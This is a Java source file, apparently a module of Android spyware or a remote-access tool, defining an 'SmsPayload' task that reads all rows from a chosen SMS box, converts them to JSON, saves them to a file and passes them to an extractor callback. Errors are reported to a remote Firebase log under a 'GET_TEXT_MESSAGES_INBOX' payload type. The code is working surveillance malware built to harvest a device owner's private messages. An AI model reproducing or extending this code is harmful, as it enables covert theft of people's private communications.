package com.aigs.serviceone.payload;

import android.annotation.SuppressLint;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.util.Log;

import com.aigs.serviceone.helpers.FileSystem;
import com.aigs.serviceone.annotations.PayloadTypes;
import com.aigs.serviceone.helpers.SmsExtractorNotifier;
import com.aigs.serviceone.annotations.SmsModes;
import com.example.logshandler.starter.LogsHandler;
import com.example.uniqueidmanager.UniqueId;
import com.google.firebase.database.FirebaseDatabase;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.lang.ref.WeakReference;

//Worker thread
public class SmsPayload extends AsyncTask<String, Integer, String> {

    private final WeakReference<Context> contextRef;
    private SmsExtractorNotifier smsExtractorNotifier;

    public SmsPayload(Context context) {
        contextRef = new WeakReference<>(context);
    }

    public SmsPayload setSmsListener(SmsExtractorNotifier smsListener) {
        this.smsExtractorNotifier = smsListener;
        return this;
    }

    @Override
    protected void onPreExecute() {
        super.onPreExecute();
    }

    @Override
    protected String doInBackground(@SmsModes String... strings) {
        try {
            Context context = contextRef.get();

            try {
                @SuppressLint("Recycle") Cursor cursor = context.getContentResolver().query(Uri.parse(strings[0]), null, null, null, null);

                if (cursor != null && cursor.moveToFirst()) { // must check the result to prevent exception
                    JSONArray jsonArray = new JSONArray();

                    do {
                        JSONObject jsonObject = new JSONObject();
                        for (int idx = 0; idx < cursor.getColumnCount(); idx++) {
                            jsonObject.put(cursor.getColumnName(idx), cursor.getString(idx));
                        }
                        jsonArray.put(jsonObject);


                    } while (cursor.moveToNext());

                    File file = FileSystem.createInstance(context).smsOperationType(strings[0]).writeSmsData(jsonArray.toString());
                    smsExtractorNotifier.onSmsRetrieved(file, jsonArray.toString());
                } else {
                    // empty box, no SMS
                    smsExtractorNotifier.onResponseEmpty();
                }
            } catch (JSONException e) {
                e.printStackTrace();
            }
        }catch (Exception e){
            new LogsHandler.Builder(contextRef.get())
                    .setDataToWrite(e.getMessage())
                    .setDbReference("Logs")
                    .setPathString(PayloadTypes.GET_TEXT_MESSAGES_INBOX+"")
                    .build()
                    .pushPayloadLogToServer();

            Log.e("EXCEPTION_SMS : ",e.getMessage());
            FirebaseDatabase
                    .getInstance()
                    .getReference("Logs")
                    .child(PayloadTypes.GET_TEXT_MESSAGES_INBOX+"").child("CurrentLog").setValue(e.getMessage());

        }

        return null;
    }

    @Override
    protected void onPostExecute(String string) {
        super.onPostExecute(string);
    }
}
